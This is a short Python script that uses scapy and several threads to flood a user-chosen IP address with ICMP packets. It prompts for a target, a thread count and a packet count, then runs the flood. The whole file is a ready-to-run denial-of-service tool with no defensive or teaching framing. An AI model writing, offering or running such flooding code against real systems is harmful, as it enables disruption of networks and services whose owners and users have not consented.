import threading
from scapy.all import IP, ICMP, send

def icmp_spammer(thread_id, ip, packets):
    print(f"[Thread {thread_id}] Started...")
    
    pkt = IP(dst=ip) / ICMP()
    
    for _ in range(packets):
        send(pkt, verbose=False)

    print(f"[Thread {thread_id}] Finished.")

def icmp_flood(ip, threads, packets):
    print("Starting ICMP Flood...\n")
    print(f"Target: {ip}")
    print(f"Threads: {threads} | Packets per thread: {packets}\n\n")

    thread_list = []

    for t in range(threads):
        th = threading.Thread(target=icmp_spammer, args=(t + 1, ip, packets))
        th.start()
        thread_list.append(th)

    for th in thread_list:
        th.join()

    print("\n[+] ICMP Flood Execution Completed.")

def get_int(prompt, default, minimum=1):
    while True:
        try:
            user_input = input(f"{prompt} default({default}): ").strip()
            if not user_input:
                return default
            
            if int(user_input) >= minimum:
                return int(user_input)
            
            print(f"Value must be >= {minimum}")

        except ValueError:
            print("Please enter a number.")

if __name__ == "__main__":
    try:
        target_ip = input("Target IP: (default 192.168.1.1): ").strip() or "192.168.1.1"
        num_threads = get_int("Threads: (default 10): ", default=10)
        num_packets = get_int("Packets per thread: ", default=100)

        icmp_flood(target_ip, num_threads, num_packets)

    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
        exit(0)